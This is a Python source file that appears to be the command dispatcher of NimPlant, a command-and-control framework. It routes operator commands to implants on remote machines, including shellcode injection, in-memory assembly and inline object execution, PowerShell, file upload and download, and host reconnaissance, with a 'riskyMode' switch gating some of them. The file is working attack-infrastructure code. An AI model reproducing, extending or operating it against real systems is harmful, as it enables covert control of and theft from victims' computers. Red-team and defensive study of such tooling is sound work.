from .func import log, nimplantPrint
from .nimplant import np_server
from yaml.loader import FullLoader
import shlex
import yaml


def getCommands():
    with open("server/util/commands.yaml", "r") as f:
        return sorted(yaml.load(f, Loader=FullLoader), key=lambda c: c["command"])


def getCommandList():
    return [c["command"] for c in getCommands()]


def getRiskyCommandList():
    return [c["command"] for c in getCommands() if c["risky_command"]]


def handleCommand(raw_command, np=None):
    if np == None:
        np = np_server.getActiveNimplant()

    log(f"NimPlant {np.id} $ > {raw_command}", np.guid)

    try:
        args = shlex.split(raw_command.replace("\\", "\\\\"))
        cmd = raw_command.lower().split(" ")[0]
        nimplantCmds = [cmd.lower() for cmd in getCommandList()]

        # Handle commands
        if cmd == "":
            pass

        elif cmd in getRiskyCommandList() and not np.riskyMode:
            msg = (
                f"Uh oh, you compiled this Nimplant in safe mode and '{cmd}' is considered to be a risky command.\n"
                "Please enable 'riskyMode' in 'config.toml' and re-compile Nimplant!"
            )
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "cancel":
            np.cancelAllTasks()
            nimplantPrint(
                f"All tasks cancelled for Nimplant {np.id}.", np.guid, raw_command
            )

        elif cmd == "clear":
            from .func import cls

            cls()

        elif cmd == "getpid":
            msg = f"NimPlant PID is {np.pid}"
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "getprocname":
            msg = f"NimPlant is running inside of {np.pname}"
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "help":
            if len(args) == 2:
                from .func import getCommandHelp

                msg = getCommandHelp(args[1])
            else:
                from .func import getHelpMenu

                msg = getHelpMenu()

            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "hostname":
            msg = f"NimPlant hostname is: {np.hostname}"
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "ipconfig":
            msg = f"NimPlant external IP address is: {np.ipAddrExt}\n"
            msg += f"NimPlant internal IP address is: {np.ipAddrInt}"
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "list":
            msg = np_server.getInfo()
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "listall":
            msg = np_server.getInfo(all=True)
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "nimplant":
            msg = np.getInfo()
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "osbuild":
            msg = f"NimPlant OS build is: {np.osBuild}"
            nimplantPrint(msg, np.guid, raw_command)

        elif cmd == "select":
            if len(args) == 2:
                np_server.selectNimplant(args[1])
            else:
                nimplantPrint(
                    "Invalid argument length. Usage: 'select [NimPlant ID]'.",
                    np.guid,
                    raw_command,
                )

        elif cmd == "exit":
            from .func import exitServerConsole

            exitServerConsole()

        elif cmd == "upload":
            from .func import uploadFile

            uploadFile(np, args, raw_command)

        elif cmd == "download":
            from .func import downloadFile

            downloadFile(np, args, raw_command)

        elif cmd == "execute-assembly":
            from .func import executeAssembly

            executeAssembly(np, args, raw_command)

        elif cmd == "inline-execute":
            from .func import inlineExecute

            inlineExecute(np, args, raw_command)

        elif cmd == "shinject":
            from .func import shinject

            shinject(np, args, raw_command)

        elif cmd == "powershell":
            from .func import powershell

            powershell(np, args, raw_command)

        # Handle commands that do not need any server-side handling
        elif cmd in nimplantCmds:
            guid = np.addTask(raw_command)
            nimplantPrint(f"Staged command '{raw_command}'.", np.guid, taskGuid=guid)
        else:
            nimplantPrint(
                f"Unknown command. Enter 'help' to get a list of commands.",
                np.guid,
                raw_command,
            )

    except Exception as e:
        nimplantPrint(
            f"An unexpected exception occurred when handling command: {repr(e)}",
            np.guid,
            raw_command,
        )
